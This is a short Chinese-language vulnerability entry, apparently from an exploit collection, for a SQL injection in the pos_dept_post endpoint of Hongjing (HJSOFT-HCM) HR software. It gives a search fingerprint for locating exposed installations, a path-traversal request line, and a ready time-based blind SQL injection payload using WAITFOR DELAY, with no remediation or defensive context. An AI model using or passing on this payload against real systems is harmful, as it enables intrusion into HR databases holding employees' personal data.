# 宏景pos_dept_postSql注入漏洞

宏景pos_dept_post ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1`

**Payload**
```
usertable=h00&usernumber=1&i9999=-1';WAITFOR DELAY '0:0:6'--+
```